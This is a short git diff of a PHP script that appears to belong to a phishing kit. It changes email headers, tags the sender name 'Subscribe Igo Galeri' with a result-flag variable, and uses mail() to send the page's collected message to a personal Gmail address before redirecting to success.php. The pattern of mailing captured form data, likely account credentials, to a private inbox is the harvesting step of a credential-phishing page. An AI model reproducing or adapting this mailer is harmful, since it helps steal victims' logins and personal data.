@@ -117,17 +117,18 @@ Subscribe Hans Farhan
 </div>
 </center>
 ';
-//$headers  = 'MIME-Version: 1.0' . "\r\n";
-//$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
-//$headers .= 'From: Subscribe Hans Farhan ['.$resultFlags.'] <igogaleri@gmail.com>' . "\r\n";
-$from    = 'igogaleri@gmail.com';
-$to      = 'rizkipratama122019@gmail.com';
 $headers  = 'MIME-Version: 1.0' . "\r\n";
 $headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
-$headers .=
-'From: ' . $from . "\r\n" .
-'Reply-To: ' . $from . "\r\n" .
-'X-Mailer: PHP/' . phpversion();
+$headers .= 'From: Subscribe Igo Galeri ['.$resultFlags.'] <igogaleri@gmail.com>' . "\r\n";
+
+//$from    = 'igogaleri@gmail.com';
+$to      = 'rizkipratama122019@gmail.com';
+//$headers  = 'MIME-Version: 1.0' . "\r\n";
+//$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
+//$headers .=
+//'From: ' . $from . "\r\n" .
+//'Reply-To: ' . $from . "\r\n" .
+//'X-Mailer: PHP/' . phpversion();
 $kirim = mail($to, $subjek, $pesan, $headers);
 if($kirim) {
 echo "<form id='shagitz' method='POST' action='success.php'>
